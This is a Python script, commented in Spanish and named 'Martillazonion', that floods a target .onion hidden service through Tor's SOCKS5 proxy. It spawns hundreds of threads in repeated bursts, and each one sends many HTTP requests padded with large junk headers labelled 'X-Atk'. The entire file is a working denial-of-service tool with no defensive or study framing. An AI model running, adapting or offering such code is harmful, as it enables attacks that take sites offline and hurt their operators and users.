import socks
import socket
import threading
import random
import time
import argparse
import sys

# Config CLI
parser = argparse.ArgumentParser(description="Martillazonion (versión sencilla) - Ataque por un solo puerto Tor SOCKS5")
parser.add_argument("onion_host", help="Dominio .onion (v3) objetivo")
parser.add_argument("-p", "--port", type=int, default=9050, help="Puerto SOCKS5 de Tor (default: 9050)")
parser.add_argument("-t", "--threads", type=int, default=500, help="Cantidad inicial de hilos (default: 500)")
parser.add_argument("-r", "--rafaga", type=int, default=100, help="Hilos por ráfaga (default: 100)")
args = parser.parse_args()

onion_host = args.onion_host
tor_port = args.port
MAX_HILOS = args.threads
RAFA_HILOS = args.rafaga

PORT = 80
PAQUETES_POR_CONN = 80
TTL_VALUE = 1
SOCKET_TIMEOUT = 4
DELAY_ENTRE_PAKETS = 0.002
DELAY_RAFAGA = 10

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/7.87.0", "Wget/1.21.1", "Lynx/2.8.9rel.1"
]

referers = [
    "http://duckduckgo.com", "http://protonmail.com", "http://torproject.org", "http://facebookcorewwwi.onion"
]

lock = threading.Lock()
hilos_activos = 0

def generar_payload():
    headers_extra = ''.join(
        f"X-Atk-{i}: {'Z' * random.randint(300, 800)}\r\n"
        for i in range(random.randint(2, 5))
    )
    return (
        f"GET /fire?{random.randint(100000,999999)} HTTP/1.1\r\n"
        f"Host: {onion_host}\r\n"
        f"User-Agent: {random.choice(user_agents)}\r\n"
        f"Referer: {random.choice(referers)}\r\n"
        f"{headers_extra}"
        f"Connection: close\r\n\r\n"
    )

def proxy_disponible():
    try:
        s = socket.create_connection(("127.0.0.1", tor_port), timeout=2)
        s.close()
        return True
    except:
        return False

def ataque():
    global hilos_activos
    try:
        for _ in range(PAQUETES_POR_CONN):
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", tor_port)
            s.settimeout(SOCKET_TIMEOUT)
            s.connect((onion_host, PORT))
            s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, TTL_VALUE)
            s.sendall(generar_payload().encode())
            s.close()
            time.sleep(DELAY_ENTRE_PAKETS)
    except:
        time.sleep(1)
    finally:
        with lock:
            hilos_activos -= 1

def lanzar_rafaga(cantidad):
    global hilos_activos
    with lock:
        disponibles = MAX_HILOS - hilos_activos
        if disponibles <= 0:
            return
        lanzar = min(cantidad, disponibles)
        hilos_activos += lanzar

    for _ in range(lanzar):
        t = threading.Thread(target=ataque)
        t.daemon = True
        t.start()

def main_loop():
    while True:
        if proxy_disponible():
            lanzar_rafaga(RAFA_HILOS)
            with lock:
                print(f"[⚒️] Ráfaga lanzada: {RAFA_HILOS} hilos activos: {hilos_activos}")
        else:
            print(f"[✗] Tor no responde en 127.0.0.1:{tor_port}. Esperando...")
        time.sleep(DELAY_RAFAGA)

if __name__ == "__main__":
    print(f"\n[🔥] MARTILLAZONION - Versión Sencilla")
    print(f"[→] Objetivo: {onion_host}")
    print(f"[→] Usando Tor SOCKS5 en puerto {tor_port}")
    print(f"[→] Hilos máximos: {MAX_HILOS}, ráfaga: {RAFA_HILOS}\n")
    main_loop()
